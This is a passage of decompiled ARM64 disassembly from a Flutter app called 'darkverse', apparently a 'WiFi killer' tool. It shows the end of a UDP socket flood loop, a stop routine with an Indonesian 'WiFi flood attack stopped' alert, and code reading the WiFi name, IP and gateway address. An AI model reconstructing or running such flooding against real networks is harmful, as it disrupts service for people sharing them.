    // 0x94bb20: r16 = <RawDatagramSocket>
    //     0x94bb20: add             x16, PP, #0x37, lsl #12  ; [pp+0x37448] TypeArguments: <RawDatagramSocket>
    //     0x94bb24: ldr             x16, [x16, #0x448]
    // 0x94bb28: ldur            lr, [fp, #-0xa0]
    // 0x94bb2c: stp             lr, x16, [SP, #8]
    // 0x94bb30: str             x0, [SP]
    // 0x94bb34: r4 = const [0x1, 0x2, 0x2, 0x2, null]
    //     0x94bb34: ldr             x4, [PP, #0x40]  ; [pp+0x40] List(5) [0x1, 0x2, 0x2, 0x2, Null]
    // 0x94bb38: r0 = then()
    //     0x94bb38: bl              #0xaf273c  ; [dart:async] _Future::then
    // 0x94bb3c: ldur            x3, [fp, #-0x78]
    // 0x94bb40: add             x1, x3, #1
    // 0x94bb44: ldur            x0, [fp, #-0x70]
    // 0x94bb48: ldur            x2, [fp, #-0x80]
    // 0x94bb4c: b               #0x94b9e8
    // 0x94bb50: sub             SP, fp, #0xc0
    // 0x94bb54: r0 = Null
    //     0x94bb54: mov             x0, NULL
    // 0x94bb58: r0 = ReturnAsyncNotFuture()
    //     0x94bb58: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x94bb5c: ldur            x3, [fp, #-0x78]
    // 0x94bb60: ldur            x2, [fp, #-0x90]
    // 0x94bb64: mov             x0, x1
    // 0x94bb68: r0 = Throw()
    //     0x94bb68: bl              #0xbf5dcc  ; ThrowStub
    // 0x94bb6c: brk             #0
    // 0x94bb70: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94bb70: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94bb74: b               #0x94b9cc
    // 0x94bb78: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94bb78: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94bb7c: b               #0x94b9f8
    // 0x94bb80: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94bb80: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94bb84: b               #0x94ba54
  }
  [closure] void _stopFlood(dynamic) {
    // ** addr: 0x94bb88, size: 0x38
    // 0x94bb88: EnterFrame
    //     0x94bb88: stp             fp, lr, [SP, #-0x10]!
    //     0x94bb8c: mov             fp, SP
    // 0x94bb90: ldr             x0, [fp, #0x10]
    // 0x94bb94: ArrayLoad: r1 = r0[0]  ; List_4
    //     0x94bb94: ldur            w1, [x0, #0x17]
    // 0x94bb98: DecompressPointer r1
    //     0x94bb98: add             x1, x1, HEAP, lsl #32
    // 0x94bb9c: CheckStackOverflow
    //     0x94bb9c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94bba0: cmp             SP, x16
    //     0x94bba4: b.ls            #0x94bbb8
    // 0x94bba8: r0 = _stopFlood()
    //     0x94bba8: bl              #0x94bbc0  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_stopFlood
    // 0x94bbac: LeaveFrame
    //     0x94bbac: mov             SP, fp
    //     0x94bbb0: ldp             fp, lr, [SP], #0x10
    // 0x94bbb4: ret
    //     0x94bbb4: ret             
    // 0x94bbb8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94bbb8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94bbbc: b               #0x94bba8
  }
  _ _stopFlood(/* No info */) {
    // ** addr: 0x94bbc0, size: 0xa0
    // 0x94bbc0: EnterFrame
    //     0x94bbc0: stp             fp, lr, [SP, #-0x10]!
    //     0x94bbc4: mov             fp, SP
    // 0x94bbc8: AllocStack(0x8)
    //     0x94bbc8: sub             SP, SP, #8
    // 0x94bbcc: SetupParameters(_WifiKillerPageState this /* r1 => r1, fp-0x8 */)
    //     0x94bbcc: stur            x1, [fp, #-8]
    // 0x94bbd0: CheckStackOverflow
    //     0x94bbd0: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94bbd4: cmp             SP, x16
    //     0x94bbd8: b.ls            #0x94bc58
    // 0x94bbdc: r1 = 1
    //     0x94bbdc: mov             x1, #1
    // 0x94bbe0: r0 = AllocateContext()
    //     0x94bbe0: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x94bbe4: mov             x1, x0
    // 0x94bbe8: ldur            x0, [fp, #-8]
    // 0x94bbec: StoreField: r1->field_f = r0
    //     0x94bbec: stur            w0, [x1, #0xf]
    // 0x94bbf0: mov             x2, x1
    // 0x94bbf4: r1 = Function '<anonymous closure>':.
    //     0x94bbf4: add             x1, PP, #0x37, lsl #12  ; [pp+0x37520] AnonymousClosure: (0x6e8a0c), in [package:darkverse/overlay_entry.dart] _NexusBubbleState::build (0x6e85c0)
    //     0x94bbf8: ldr             x1, [x1, #0x520]
    // 0x94bbfc: r0 = AllocateClosure()
    //     0x94bbfc: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94bc00: ldur            x1, [fp, #-8]
    // 0x94bc04: mov             x2, x0
    // 0x94bc08: r0 = setState()
    //     0x94bc08: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x94bc0c: ldur            x0, [fp, #-8]
    // 0x94bc10: LoadField: r1 = r0->field_27
    //     0x94bc10: ldur            w1, [x0, #0x27]
    // 0x94bc14: DecompressPointer r1
    //     0x94bc14: add             x1, x1, HEAP, lsl #32
    // 0x94bc18: cmp             w1, NULL
    // 0x94bc1c: b.ne            #0x94bc28
    // 0x94bc20: mov             x1, x0
    // 0x94bc24: b               #0x94bc30
    // 0x94bc28: r0 = cancel()
    //     0x94bc28: bl              #0x4746e0  ; [dart:isolate] _Timer::cancel
    // 0x94bc2c: ldur            x1, [fp, #-8]
    // 0x94bc30: StoreField: r1->field_27 = rNULL
    //     0x94bc30: stur            NULL, [x1, #0x27]
    // 0x94bc34: r2 = "🛑 Stopped"
    //     0x94bc34: add             x2, PP, #0x37, lsl #12  ; [pp+0x37528] "🛑 Stopped"
    //     0x94bc38: ldr             x2, [x2, #0x528]
    // 0x94bc3c: r3 = "WiFi flood attack dihentikan."
    //     0x94bc3c: add             x3, PP, #0x37, lsl #12  ; [pp+0x37530] "WiFi flood attack dihentikan."
    //     0x94bc40: ldr             x3, [x3, #0x530]
    // 0x94bc44: r0 = _showAlert()
    //     0x94bc44: bl              #0x94b554  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_showAlert
    // 0x94bc48: r0 = Null
    //     0x94bc48: mov             x0, NULL
    // 0x94bc4c: LeaveFrame
    //     0x94bc4c: mov             SP, fp
    //     0x94bc50: ldp             fp, lr, [SP], #0x10
    // 0x94bc54: ret
    //     0x94bc54: ret             
    // 0x94bc58: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94bc58: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94bc5c: b               #0x94bbdc
  }
  _ initState(/* No info */) {
    // ** addr: 0x98e9a0, size: 0x30
    // 0x98e9a0: EnterFrame
    //     0x98e9a0: stp             fp, lr, [SP, #-0x10]!
    //     0x98e9a4: mov             fp, SP
    // 0x98e9a8: CheckStackOverflow
    //     0x98e9a8: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x98e9ac: cmp             SP, x16
    //     0x98e9b0: b.ls            #0x98e9c8
    // 0x98e9b4: r0 = _loadWifiInfo()
    //     0x98e9b4: bl              #0x98e9d0  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_loadWifiInfo
    // 0x98e9b8: r0 = Null
    //     0x98e9b8: mov             x0, NULL
    // 0x98e9bc: LeaveFrame
    //     0x98e9bc: mov             SP, fp
    //     0x98e9c0: ldp             fp, lr, [SP], #0x10
    // 0x98e9c4: ret
    //     0x98e9c4: ret             
    // 0x98e9c8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x98e9c8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x98e9cc: b               #0x98e9b4
  }
  _ _loadWifiInfo(/* No info */) async {
    // ** addr: 0x98e9d0, size: 0x1cc
    // 0x98e9d0: EnterFrame
    //     0x98e9d0: stp             fp, lr, [SP, #-0x10]!
    //     0x98e9d4: mov             fp, SP
    // 0x98e9d8: AllocStack(0x98)
    //     0x98e9d8: sub             SP, SP, #0x98
    // 0x98e9dc: SetupParameters(_WifiKillerPageState this /* r1 => r1, fp-0x78 */)
    //     0x98e9dc: stur            NULL, [fp, #-8]
    //     0x98e9e0: stur            x1, [fp, #-0x78]
    // 0x98e9e4: CheckStackOverflow
    //     0x98e9e4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x98e9e8: cmp             SP, x16
    //     0x98e9ec: b.ls            #0x98eb94
    // 0x98e9f0: r1 = 4
    //     0x98e9f0: mov             x1, #4
    // 0x98e9f4: r0 = AllocateContext()
    //     0x98e9f4: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x98e9f8: mov             x2, x0
    // 0x98e9fc: ldur            x1, [fp, #-0x78]
    // 0x98ea00: stur            x2, [fp, #-0x80]
    // 0x98ea04: StoreField: r2->field_f = r1
    //     0x98ea04: stur            w1, [x2, #0xf]
    // 0x98ea08: InitAsync() -> Future<void?>
    //     0x98ea08: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x98ea0c: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x98ea10: r1 = Null
    //     0x98ea10: mov             x1, NULL
    // 0x98ea14: r0 = NetworkInfo()
    //     0x98ea14: bl              #0x983550  ; [package:network_info_plus/network_info_plus.dart] NetworkInfo::NetworkInfo
    // 0x98ea18: r1 = Instance_PermissionWithService
    //     0x98ea18: add             x1, PP, #0x37, lsl #12  ; [pp+0x37540] Obj!PermissionWithService@a003d1
    //     0x98ea1c: ldr             x1, [x1, #0x540]
    // 0x98ea20: stur            x0, [fp, #-0x88]
    // 0x98ea24: r0 = PermissionActions.request()
    //     0x98ea24: bl              #0x8b7d58  ; [package:permission_handler/permission_handler.dart] ::PermissionActions.request
    // 0x98ea28: mov             x1, x0
    // 0x98ea2c: stur            x1, [fp, #-0x90]
    // 0x98ea30: r0 = Await()
    //     0x98ea30: bl              #0x4a3d90  ; AwaitStub
    // 0x98ea34: r16 = Instance_PermissionStatus
    //     0x98ea34: add             x16, PP, #0x37, lsl #12  ; [pp+0x37548] Obj!PermissionStatus@a3dde1
    //     0x98ea38: ldr             x16, [x16, #0x548]
    // 0x98ea3c: cmp             w0, w16
    // 0x98ea40: b.eq            #0x98ea64
    // 0x98ea44: ldur            x1, [fp, #-0x78]
    // 0x98ea48: r2 = "Permission Denied"
    //     0x98ea48: add             x2, PP, #0x37, lsl #12  ; [pp+0x37550] "Permission Denied"
    //     0x98ea4c: ldr             x2, [x2, #0x550]
    // 0x98ea50: r3 = "Akses lokasi diperlukan untuk membaca info WiFi."
    //     0x98ea50: add             x3, PP, #0x37, lsl #12  ; [pp+0x37558] "Akses lokasi diperlukan untuk membaca info WiFi."
    //     0x98ea54: ldr             x3, [x3, #0x558]
    // 0x98ea58: r0 = _showAlert()
    //     0x98ea58: bl              #0x94b554  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_showAlert
    // 0x98ea5c: r0 = Null
    //     0x98ea5c: mov             x0, NULL
    // 0x98ea60: r0 = ReturnAsyncNotFuture()
    //     0x98ea60: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x98ea64: ldur            x0, [fp, #-0x78]
    // 0x98ea68: ldur            x2, [fp, #-0x80]
    // 0x98ea6c: ldur            x1, [fp, #-0x88]
    // 0x98ea70: r0 = getWifiName()
    //     0x98ea70: bl              #0x983768  ; [package:network_info_plus/network_info_plus.dart] NetworkInfo::getWifiName
    // 0x98ea74: mov             x1, x0
    // 0x98ea78: stur            x1, [fp, #-0x90]
    // 0x98ea7c: r0 = Await()
    //     0x98ea7c: bl              #0x4a3d90  ; AwaitStub
    // 0x98ea80: ldur            x2, [fp, #-0x80]
    // 0x98ea84: StoreField: r2->field_13 = r0
    //     0x98ea84: stur            w0, [x2, #0x13]
    //     0x98ea88: tbz             w0, #0, #0x98eaa4
    //     0x98ea8c: ldurb           w16, [x2, #-1]
    //     0x98ea90: ldurb           w17, [x0, #-1]
    //     0x98ea94: and             x16, x17, x16, lsr #2
    //     0x98ea98: tst             x16, HEAP, lsr #32
    //     0x98ea9c: b.eq            #0x98eaa4
    //     0x98eaa0: bl              #0xbf6254  ; WriteBarrierWrappersStub
    // 0x98eaa4: ldur            x1, [fp, #-0x88]
    // 0x98eaa8: r0 = getWifiIP()
    //     0x98eaa8: bl              #0x9836c8  ; [package:network_info_plus/network_info_plus.dart] NetworkInfo::getWifiIP
    // 0x98eaac: mov             x1, x0
    // 0x98eab0: stur            x1, [fp, #-0x90]
    // 0x98eab4: r0 = Await()
    //     0x98eab4: bl              #0x4a3d90  ; AwaitStub
    // 0x98eab8: ldur            x2, [fp, #-0x80]
    // 0x98eabc: ArrayStore: r2[0] = r0  ; List_4
    //     0x98eabc: stur            w0, [x2, #0x17]
    //     0x98eac0: tbz             w0, #0, #0x98eadc
    //     0x98eac4: ldurb           w16, [x2, #-1]
    //     0x98eac8: ldurb           w17, [x0, #-1]
    //     0x98eacc: and             x16, x17, x16, lsr #2
    //     0x98ead0: tst             x16, HEAP, lsr #32
    //     0x98ead4: b.eq            #0x98eadc
    //     0x98ead8: bl              #0xbf6254  ; WriteBarrierWrappersStub
    // 0x98eadc: ldur            x1, [fp, #-0x88]
    // 0x98eae0: r0 = getWifiGatewayIP()
    //     0x98eae0: bl              #0x983584  ; [package:network_info_plus/network_info_plus.dart] NetworkInfo::getWifiGatewayIP
    // 0x98eae4: mov             x1, x0
    // 0x98eae8: stur            x1, [fp, #-0x90]
    // 0x98eaec: r0 = Await()
    //     0x98eaec: bl              #0x4a3d90  ; AwaitStub
    // 0x98eaf0: ldur            x3, [fp, #-0x80]
    // 0x98eaf4: StoreField: r3->field_1b = r0
    //     0x98eaf4: stur            w0, [x3, #0x1b]
    //     0x98eaf8: tbz             w0, #0, #0x98eb14
    //     0x98eafc: ldurb           w16, [x3, #-1]
    //     0x98eb00: ldurb           w17, [x0, #-1]
    //     0x98eb04: and             x16, x17, x16, lsr #2
    //     0x98eb08: tst             x16, HEAP, lsr #32
    //     0x98eb0c: b.eq            #0x98eb14
    //     0x98eb10: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x98eb14: mov             x2, x3
    // 0x98eb18: r1 = Function '<anonymous closure>':.
    //     0x98eb18: add             x1, PP, #0x37, lsl #12  ; [pp+0x37560] AnonymousClosure: (0x98ebd0), in [package:darkverse/wifi_external.dart] _WifiKillerPageState::_loadWifiInfo (0x98e9d0)
    //     0x98eb1c: ldr             x1, [x1, #0x560]
    // 0x98eb20: r0 = AllocateClosure()
    //     0x98eb20: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x98eb24: ldur            x1, [fp, #-0x78]
    // 0x98eb28: mov             x2, x0
    // 0x98eb2c: r0 = setState()
    //     0x98eb2c: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x98eb30: r1 = Null
    //     0x98eb30: mov             x1, NULL
    // 0x98eb34: r2 = 4
    //     0x98eb34: mov             x2, #4
    // 0x98eb38: r0 = AllocateArray()
    //     0x98eb38: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x98eb3c: r16 = "Router IP: "
    //     0x98eb3c: add             x16, PP, #0x37, lsl #12  ; [pp+0x37568] "Router IP: "
    //     0x98eb40: ldr             x16, [x16, #0x568]
    // 0x98eb44: StoreField: r0->field_f = r16
    //     0x98eb44: stur            w16, [x0, #0xf]
    // 0x98eb48: ldur            x1, [fp, #-0x78]
    // 0x98eb4c: LoadField: r2 = r1->field_1f
    //     0x98eb4c: ldur            w2, [x1, #0x1f]
    // 0x98eb50: DecompressPointer r2
    //     0x98eb50: add             x2, x2, HEAP, lsl #32
    // 0x98eb54: StoreField: r0->field_13 = r2
    //     0x98eb54: stur            w2, [x0, #0x13]
    // 0x98eb58: str             x0, [SP]
    // 0x98eb5c: r0 = _interpolate()
    //     0x98eb5c: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x98eb60: mov             x1, x0
    // 0x98eb64: r0 = print()
    //     0x98eb64: bl              #0x4bbd08  ; [dart:core] ::print
    // 0x98eb68: b               #0x98eb8c
    // 0x98eb6c: sub             SP, fp, #0x98
    // 0x98eb70: ldur            x2, [fp, #-0x80]
    // 0x98eb74: r1 = Function '<anonymous closure>':.
    //     0x98eb74: add             x1, PP, #0x37, lsl #12  ; [pp+0x37570] AnonymousClosure: (0x98eb9c), in [package:darkverse/wifi_external.dart] _WifiKillerPageState::_loadWifiInfo (0x98e9d0)
    //     0x98eb78: ldr             x1, [x1, #0x570]
    // 0x98eb7c: r0 = AllocateClosure()
    //     0x98eb7c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x98eb80: ldur            x1, [fp, #-0x78]
    // 0x98eb84: mov             x2, x0
    // 0x98eb88: r0 = setState()
    //     0x98eb88: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x98eb8c: r0 = Null
    //     0x98eb8c: mov             x0, NULL
    // 0x98eb90: r0 = ReturnAsyncNotFuture()
    //     0x98eb90: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x98eb94: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x98eb94: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x98eb98: b               #0x98e9f0
  }
  [closure] void <anonymous closure>(dynamic) {
    // ** addr: 0x98eb9c, size: 0x34
    // 0x98eb9c: r1 = "Error"
    //     0x98eb9c: add             x1, PP, #0xf, lsl #12  ; [pp+0xfb20] "Error"
    //     0x98eba0: ldr             x1, [x1, #0xb20]
    // 0x98eba4: ldr             x2, [SP]
    // 0x98eba8: ArrayLoad: r3 = r2[0]  ; List_4
    //     0x98eba8: ldur            w3, [x2, #0x17]
    // 0x98ebac: DecompressPointer r3
    //     0x98ebac: add             x3, x3, HEAP, lsl #32
    // 0x98ebb0: LoadField: r2 = r3->field_f
    //     0x98ebb0: ldur            w2, [x3, #0xf]
    // 0x98ebb4: DecompressPointer r2
    //     0x98ebb4: add             x2, x2, HEAP, lsl #32
    // 0x98ebb8: StoreField: r2->field_1f = r1
    //     0x98ebb8: stur            w1, [x2, #0x1f]
    // 0x98ebbc: StoreField: r2->field_1b = r1
    //     0x98ebbc: stur            w1, [x2, #0x1b]
    // 0x98ebc0: ArrayStore: r2[0] = r1  ; List_4
    //     0x98ebc0: stur            w1, [x2, #0x17]
    // 0x98ebc4: StoreField: r2->field_13 = r1
    //     0x98ebc4: stur            w1, [x2, #0x13]
    // 0x98ebc8: r0 = Null
    //     0x98ebc8: mov             x0, NULL
    // 0x98ebcc: ret
    //     0x98ebcc: ret             
  }
  [closure] void <anonymous closure>(dynamic) {
    // ** addr: 0x98ebd0, size: 0xdc
    // 0x98ebd0: EnterFrame
    //     0x98ebd0: stp             fp, lr, [SP, #-0x10]!
    //     0x98ebd4: mov             fp, SP
    // 0x98ebd8: ldr             x1, [fp, #0x10]
    // 0x98ebdc: ArrayLoad: r2 = r1[0]  ; List_4
    //     0x98ebdc: ldur            w2, [x1, #0x17]
    // 0x98ebe0: DecompressPointer r2
    //     0x98ebe0: add             x2, x2, HEAP, lsl #32
    // 0x98ebe4: LoadField: r1 = r2->field_f
    //     0x98ebe4: ldur            w1, [x2, #0xf]
    // 0x98ebe8: DecompressPointer r1
    //     0x98ebe8: add             x1, x1, HEAP, lsl #32
    // 0x98ebec: LoadField: r3 = r2->field_13
    //     0x98ebec: ldur            w3, [x2, #0x13]
    // 0x98ebf0: DecompressPointer r3
    //     0x98ebf0: add             x3, x3, HEAP, lsl #32
    // 0x98ebf4: cmp             w3, NULL
    // 0x98ebf8: b.ne            #0x98ec04
    // 0x98ebfc: r0 = "-"
    //     0x98ebfc: ldr             x0, [PP, #0x33d0]  ; [pp+0x33d0] "-"
    // 0x98ec00: b               #0x98ec08
    // 0x98ec04: mov             x0, x3
    // 0x98ec08: StoreField: r1->field_13 = r0
    //     0x98ec08: stur            w0, [x1, #0x13]
    //     0x98ec0c: ldurb           w16, [x1, #-1]
    //     0x98ec10: ldurb           w17, [x0, #-1]
    //     0x98ec14: and             x16, x17, x16, lsr #2
    //     0x98ec18: tst             x16, HEAP, lsr #32
    //     0x98ec1c: b.eq            #0x98ec24
    //     0x98ec20: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x98ec24: ArrayLoad: r3 = r2[0]  ; List_4
    //     0x98ec24: ldur            w3, [x2, #0x17]
    // 0x98ec28: DecompressPointer r3
    //     0x98ec28: add             x3, x3, HEAP, lsl #32
    // 0x98ec2c: cmp             w3, NULL
    // 0x98ec30: b.ne            #0x98ec3c
    // 0x98ec34: r0 = "-"
    //     0x98ec34: ldr             x0, [PP, #0x33d0]  ; [pp+0x33d0] "-"
    // 0x98ec38: b               #0x98ec40
    // 0x98ec3c: mov             x0, x3
    // 0x98ec40: ArrayStore: r1[0] = r0  ; List_4
    //     0x98ec40: stur            w0, [x1, #0x17]
    //     0x98ec44: ldurb           w16, [x1, #-1]
    //     0x98ec48: ldurb           w17, [x0, #-1]
    //     0x98ec4c: and             x16, x17, x16, lsr #2
    //     0x98ec50: tst             x16, HEAP, lsr #32
    //     0x98ec54: b.eq            #0x98ec5c
    //     0x98ec58: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x98ec5c: LoadField: r3 = r2->field_1b
    //     0x98ec5c: ldur            w3, [x2, #0x1b]
    // 0x98ec60: DecompressPointer r3
    //     0x98ec60: add             x3, x3, HEAP, lsl #32
    // 0x98ec64: cmp             w3, NULL
    // 0x98ec68: b.ne            #0x98ec74
    // 0x98ec6c: r0 = "-"
    //     0x98ec6c: ldr             x0, [PP, #0x33d0]  ; [pp+0x33d0] "-"
    // 0x98ec70: b               #0x98ec78
    // 0x98ec74: mov             x0, x3
    // 0x98ec78: r2 = "-"
    //     0x98ec78: ldr             x2, [PP, #0x33d0]  ; [pp+0x33d0] "-"
    // 0x98ec7c: StoreField: r1->field_1f = r0
    //     0x98ec7c: stur            w0, [x1, #0x1f]
    //     0x98ec80: ldurb           w16, [x1, #-1]
    //     0x98ec84: ldurb           w17, [x0, #-1]
    //     0x98ec88: and             x16, x17, x16, lsr #2
    //     0x98ec8c: tst             x16, HEAP, lsr #32
    //     0x98ec90: b.eq            #0x98ec98
    //     0x98ec94: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x98ec98: StoreField: r1->field_1b = r2
    //     0x98ec98: stur            w2, [x1, #0x1b]
    // 0x98ec9c: r0 = Null
    //     0x98ec9c: mov             x0, NULL
    // 0x98eca0: LeaveFrame
    //     0x98eca0: mov             SP, fp
    //     0x98eca4: ldp             fp, lr, [SP], #0x10
    // 0x98eca8: ret
    //     0x98eca8: ret             
  }
  _ dispose(/* No info */) {
    // ** addr: 0x9aea58, size: 0x30
    // 0x9aea58: EnterFrame
    //     0x9aea58: stp             fp, lr, [SP, #-0x10]!
    //     0x9aea5c: mov             fp, SP
    // 0x9aea60: CheckStackOverflow
    //     0x9aea60: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x9aea64: cmp             SP, x16
    //     0x9aea68: b.ls            #0x9aea80
    // 0x9aea6c: r0 = _stopFlood()
    //     0x9aea6c: bl              #0x94bbc0  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_stopFlood
    // 0x9aea70: r0 = Null
    //     0x9aea70: mov             x0, NULL
    // 0x9aea74: LeaveFrame
    //     0x9aea74: mov             SP, fp
    //     0x9aea78: ldp             fp, lr, [SP], #0x10
    // 0x9aea7c: ret
    //     0x9aea7c: ret             
    // 0x9aea80: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x9aea80: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x9aea84: b               #0x9aea6c
  }
  _ _WifiKillerPageState(/* No info */) {
    // ** addr: 0x9ee934, size: 0x104
    // 0x9ee934: EnterFrame
    //     0x9ee934: stp             fp, lr, [SP, #-0x10]!
    //     0x9ee938: mov             fp, SP
    // 0x9ee93c: AllocStack(0x8)
    //     0x9ee93c: sub             SP, SP, #8
    // 0x9ee940: r5 = "-"
    //     0x9ee940: ldr             x5, [PP, #0x33d0]  ; [pp+0x33d0] "-"
    // 0x9ee944: r4 = false
    //     0x9ee944: add             x4, NULL, #0x30  ; false
    // 0x9ee948: r3 = Instance_Color
    //     0x9ee948: add             x3, PP, #0x32, lsl #12  ; [pp+0x32708] Obj!Color@a11581
    //     0x9ee94c: ldr             x3, [x3, #0x708]
    // 0x9ee950: r2 = Instance_Color
    //     0x9ee950: add             x2, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x9ee954: ldr             x2, [x2, #0xd28]
    // 0x9ee958: r0 = Instance_LinearGradient
    //     0x9ee958: add             x0, PP, #0x32, lsl #12  ; [pp+0x32710] Obj!LinearGradient@a05ae1
    //     0x9ee95c: ldr             x0, [x0, #0x710]
    // 0x9ee960: stur            x1, [fp, #-8]
    // 0x9ee964: StoreField: r1->field_13 = r5
    //     0x9ee964: stur            w5, [x1, #0x13]
    // 0x9ee968: ArrayStore: r1[0] = r5  ; List_4
    //     0x9ee968: stur            w5, [x1, #0x17]
    // 0x9ee96c: StoreField: r1->field_1b = r5
    //     0x9ee96c: stur            w5, [x1, #0x1b]
    // 0x9ee970: StoreField: r1->field_1f = r5
    //     0x9ee970: stur            w5, [x1, #0x1f]
    // 0x9ee974: StoreField: r1->field_23 = r4
    //     0x9ee974: stur            w4, [x1, #0x23]
    // 0x9ee978: StoreField: r1->field_2b = r3
    //     0x9ee978: stur            w3, [x1, #0x2b]
    // 0x9ee97c: StoreField: r1->field_2f = r2
    //     0x9ee97c: stur            w2, [x1, #0x2f]
    // 0x9ee980: StoreField: r1->field_33 = r2
    //     0x9ee980: stur            w2, [x1, #0x33]
    // 0x9ee984: StoreField: r1->field_3f = r0
    //     0x9ee984: stur            w0, [x1, #0x3f]
    // 0x9ee988: r0 = Color()
    //     0x9ee988: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x9ee98c: r1 = Instance_ColorSpace
    //     0x9ee98c: ldr             x1, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x9ee990: StoreField: r0->field_27 = r1
    //     0x9ee990: stur            w1, [x0, #0x27]
    // 0x9ee994: d0 = 0.866667
    //     0x9ee994: add             x17, PP, #0xb, lsl #12  ; [pp+0xb870] IMM: double(0.8666666666666667) from 0x3febbbbbbbbbbbbc
    //     0x9ee998: ldr             d0, [x17, #0x870]
    // 0x9ee99c: StoreField: r0->field_7 = d0
    //     0x9ee99c: stur            d0, [x0, #7]
    // 0x9ee9a0: d0 = 0.101961
    //     0x9ee9a0: ldr             d0, [PP, #0x6f30]  ; [pp+0x6f30] IMM: double(0.10196078431372549) from 0x3fba1a1a1a1a1a1a
    // 0x9ee9a4: StoreField: r0->field_f = d0
    //     0x9ee9a4: stur            d0, [x0, #0xf]
    // 0x9ee9a8: d1 = 0.047059
    //     0x9ee9a8: add             x17, PP, #0xc, lsl #12  ; [pp+0xcee0] IMM: double(0.047058823529411764) from 0x3fa8181818181818
    //     0x9ee9ac: ldr             d1, [x17, #0xee0]
    // 0x9ee9b0: ArrayStore: r0[0] = d1  ; List_8
    //     0x9ee9b0: stur            d1, [x0, #0x17]
    // 0x9ee9b4: StoreField: r0->field_1f = d1
    //     0x9ee9b4: stur            d1, [x0, #0x1f]
    // 0x9ee9b8: ldur            x2, [fp, #-8]
    // 0x9ee9bc: StoreField: r2->field_37 = r0
    //     0x9ee9bc: stur            w0, [x2, #0x37]
    //     0x9ee9c0: ldurb           w16, [x2, #-1]
    //     0x9ee9c4: ldurb           w17, [x0, #-1]
    //     0x9ee9c8: and             x16, x17, x16, lsr #2
    //     0x9ee9cc: tst             x16, HEAP, lsr #32
    //     0x9ee9d0: b.eq            #0x9ee9d8
    //     0x9ee9d4: bl              #0xbf6254  ; WriteBarrierWrappersStub
    // 0x9ee9d8: r0 = Color()
    //     0x9ee9d8: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x9ee9dc: r1 = Instance_ColorSpace
    //     0x9ee9dc: ldr             x1, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x9ee9e0: StoreField: r0->field_27 = r1
    //     0x9ee9e0: stur            w1, [x0, #0x27]
    // 0x9ee9e4: d0 = 0.541176
    //     0x9ee9e4: add             x17, PP, #0x23, lsl #12  ; [pp+0x23f70] IMM: double(0.5411764705882353) from 0x3fe1515151515151
    //     0x9ee9e8: ldr             d0, [x17, #0xf70]
    // 0x9ee9ec: StoreField: r0->field_7 = d0
    //     0x9ee9ec: stur            d0, [x0, #7]
    // 0x9ee9f0: d0 = 0.101961
    //     0x9ee9f0: ldr             d0, [PP, #0x6f30]  ; [pp+0x6f30] IMM: double(0.10196078431372549) from 0x3fba1a1a1a1a1a1a
    // 0x9ee9f4: StoreField: r0->field_f = d0
    //     0x9ee9f4: stur            d0, [x0, #0xf]
    // 0x9ee9f8: d0 = 0.047059
    //     0x9ee9f8: add             x17, PP, #0xc, lsl #12  ; [pp+0xcee0] IMM: double(0.047058823529411764) from 0x3fa8181818181818
    //     0x9ee9fc: ldr             d0, [x17, #0xee0]
    // 0x9eea00: ArrayStore: r0[0] = d0  ; List_8
    //     0x9eea00: stur            d0, [x0, #0x17]
    // 0x9eea04: StoreField: r0->field_1f = d0
    //     0x9eea04: stur            d0, [x0, #0x1f]
